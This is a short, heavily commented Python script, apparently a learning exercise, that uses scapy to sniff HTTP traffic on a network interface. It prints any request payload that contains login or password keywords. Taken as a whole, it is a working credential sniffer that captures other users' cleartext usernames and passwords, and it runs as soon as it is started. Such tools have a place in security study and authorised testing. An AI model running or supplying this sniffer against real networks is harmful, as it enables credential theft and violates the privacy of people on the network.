#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http # Module to be able to filter HTTP packets, we have to install it running "pip install scapy_http" in the terminal too

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # iface set the interface we are going to sniff on
    # store Tell scapy not to store packets in memory so no pressure in our computer
    # prn here we can call a function each time the function catch a package (data)
    # filter Would Allows us to filter packets using Berkeley packet filter syntax (BPF) check https://biot.com/capstats/bpf.html

def process_sniffed_packet(packet):
    # Check if the packet has a HTTPRequest layer, URLs, imges, videos, passwords, are sent using HTTPRequest layer
    if packet.haslayer(http.HTTPRequest): # We use http.HTTPRequest because scapy doesn't have a http filter by default
        if packet.haslayer(scapy.Raw): # Command to chech if the packet has a specific layer. We saw, when running the script, that the useful info is in the 'raw' layer
            load = packet[scapy.Raw].load # packet (packet name)  [scapy.Raw](layer we are interested in PRINTING) .load(To print a specific field within the layer)
            load_str = load.decode() # Convert bytes to string using UTF-8 encoding, to avoid "TypeError: a bytes-like object is required, not 'str'" error
            keywords = ["username", "user", "login", "password", "pass"] #Possible keywords in the load field
            for keyword in keywords:
                if keyword in load_str:
                    print(load)
                    break # To print load field value at most one, in case more than one keyword is in load layer
            #print(packet.show()) # .show() To know which layer contains the info we are looking for

sniff("eth0")